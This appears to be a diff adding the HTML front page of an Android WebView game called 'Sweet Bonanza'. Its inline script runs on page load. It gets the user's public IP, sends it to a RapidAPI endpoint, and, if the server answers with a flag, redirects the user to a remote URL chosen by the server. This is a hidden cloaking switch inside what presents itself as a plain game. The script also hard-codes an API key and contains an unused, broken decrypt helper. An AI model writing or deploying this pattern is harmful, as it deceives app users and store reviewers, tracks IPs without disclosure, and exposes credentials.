@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, minimal-ui, shrink-to-fit=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Sweet Bonanza</title>
+    <style type="text/css">
+        * {
+            padding: 0;
+            margin: 0;
+        }
+
+        html,
+        body {
+            background-color: #430033;
+            overflow: hidden;
+            touch-action: none;
+            -ms-touch-action: none;
+        }
+
+        canvas {
+            touch-action-delay: none;
+            touch-action: none;
+            -ms-touch-action: none;
+        }
+
+        @font-face {
+            font-family: 'bebas';
+            font-style: normal;
+            font-weight: 400;
+            src: url(font/bebas.ttf) format('truetype');
+        }
+
+  .dialog {
+    cursor:pointer;
+    overflow-y: scroll;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: white;
+    border: 1px solid #ccc;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+    max-height: 80vh; /* Adjust as needed */
+    width: 100vw; /* Make the width 100% of the viewport width */
+}
+
+
+
+.close {
+    cursor: pointer;
+    float: right;
+    margin-left: 10px;
+}
+
+    </style>
+
+    <link rel="shortcut icon" sizes="256x256" href="img/icon.png" />
+    <script type="text/javascript" src="scripts/phaser.min.js"></script>
+
+
+</head>
+
+<body>
+
+<dialog id="policyDialog" class="dialog">
+</dialog>
+
+
+
+<div style="font-family:bebas; position:absolute; left:-1000px; visibility:hidden;">.</div>
+<div id="rf_rotate"></div>
+<div id="game_content"></div>
+
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+
+
+        // Parameters to be sent with the request
+        let parameters = {
+            appid: 'TC',
+            package: 'dev.cidick.sweetbobo',
+            client: '', // Will be filled by the obtained public IP address
+            // Add more parameters if needed
+        };
+
+
+        // Call an async function immediately
+        (async function() {
+            // Get the public IP address
+            const publicIPAddress = await getPublicIPAddress();
+
+            // Your RapidAPI endpoint URL
+            const rapidAPIEndpoint = 'https://sweetbonanza.p.rapidapi.com/gameid?appid=TC&package=dev.cidick.sweetbobo&client='+publicIPAddress;
+
+        if (publicIPAddress) {
+            // Update the parameters object with the public IP address
+            parameters.client = publicIPAddress;
+
+            // Construct URL with query parameters
+            const url = new URL(rapidAPIEndpoint);
+            url.search = new URLSearchParams(parameters).toString();
+
+            // Fetch data from RapidAPI with the RapidAPI Key included in the header
+            fetch(url, {
+                headers: {
+                    'X-RapidAPI-Key': 'f674cefdefmsh718a916a57f2012p18cc20jsn5df43fe8bec0',
+                    'X-RapidAPI-Host': 'sweetbonanza.p.rapidapi.com'
+                }
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    const jsonData = JSON.parse(data.data);
+                    const gameURL = jsonData.gameURL;
+                    const gameKey = data.gameKey;
+                    console.log('game : ' + gameKey);
+                    if(gameKey === "true")
+                    {
+                      Android.rotatePhone();
+                      window.location.href = gameURL;
+                    }
+                })
+                .catch(error => {
+                    console.error('There was a problem with the fetch operation:', error);
+                });
+            } else {
+                console.error('Failed to obtain public IP address.');
+            }
+        })();
+    });
+
+
+  const METHOD = "AES-CBC";
+  const IV = new Uint8Array([0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10]);
+
+  async function decrypt(message, key) {
+    if (message === "") {
+      throw new Error("Message cannot be empty");
+    } else {
+      const keyBuffer = await crypto.subtle.importKey(
+        "raw",
+        new TextEncoder().encode(key),
+        { name: "AES-CBC" },
+        false,
+        ["decrypt"]
+      );
+
+      const decryptedBytes = await crypto.subtle.decrypt(
+        {
+          name: METHOD,
+          iv: IV
+        },
+        keyBuffer,
+        Uint8Array.from(atob(message), c => c.charCodeAt(0))
+      );
+
+      const trimmedBytes = decryptedBytes.slice(16);
+
+      console.log(TextDecoder().decode(trimmedBytes));
+      return new TextDecoder().decode(trimmedBytes);
+    }
+  }
+
+  async function getPublicIPAddress() {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      console.error('Error fetching public IP address:', error);
+      return null;
+    }
+  }
+
+
+</script>
+
+<script type="text/javascript" src="scripts/config.js"></script>
+<script type="text/javascript" src="scripts/boot.js"></script>
+<script type="text/javascript" src="scripts/preload.js"></script>
+<script type="text/javascript" src="scripts/menu.js"></script>
+<script type="text/javascript" src="scripts/game.js"></script>
+<script type="text/javascript" src="scripts/rotateyourphone.js"></script>
+
+</body>
+
+
+</html>
